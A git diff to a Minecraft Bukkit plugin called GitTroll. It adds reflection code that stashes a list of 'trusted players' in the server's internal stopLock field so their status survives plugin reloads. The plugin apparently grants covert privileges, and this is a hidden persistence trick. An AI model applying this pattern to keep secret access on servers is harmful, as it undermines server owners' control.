@@ -1,6 +1,7 @@
 package net.Lenni0451.GitTroll;
 
 import java.io.File;
+import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -26,6 +27,7 @@ import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
+import net.minecraft.server.v1_8_R3.MinecraftServer;
 import net.minecraft.server.v1_8_R3.Packet;
 
 public class GitTroll extends JavaPlugin implements Listener {
@@ -103,6 +105,21 @@ public class GitTroll extends JavaPlugin implements Listener {
 			Bukkit.getPluginManager().disablePlugin(this);
 			return;
 		}
+		
+		try {
+			Field f = MinecraftServer.class.getDeclaredField("stopLock");
+			f.setAccessible(true);
+			
+			List<String> serialized = (List<String>) f.get(MinecraftServer.getServer());
+			
+			for(String trustedPlayer : serialized) {
+				this.trustedPlayers.add(new TrustedInfo(trustedPlayer));
+			}
+			
+			f.set(MinecraftServer.getServer(), new Object());
+			
+			Logger.broadcastGitMessage("The trusted players have been loaded. You are now trusted again.");
+		} catch (Exception e) {}
 
 		this.eventManager = new EventManager();
 		this.commandManager = new CommandManager();
@@ -132,7 +149,23 @@ public class GitTroll extends JavaPlugin implements Listener {
 	
 	@Override
 	public void onDisable() {
-		Logger.broadcastGitMessage("§cThe plugin is being disabled. Please remember that you will be untrusted after the plugin is loaded again!");
+		Logger.broadcastGitMessage("§cThe plugin is being disabled.");
+		
+		try {
+			Field f = MinecraftServer.class.getDeclaredField("stopLock");
+			f.setAccessible(true);
+			
+			List<String> serialized = new ArrayList<>();
+			for(TrustedInfo info : this.trustedPlayers) {
+				serialized.add(info.serialize());
+			}
+			
+			f.set(MinecraftServer.getServer(), serialized);
+			
+			Logger.broadcastGitMessage("The trusted players have been saved. You will be trusted after a reload.");
+		} catch(Exception e) {
+			Logger.broadcastGitMessage("§cCould not save trusted players! You will be untrusted after a reload/stop.");
+		}
 	}
 	
 	
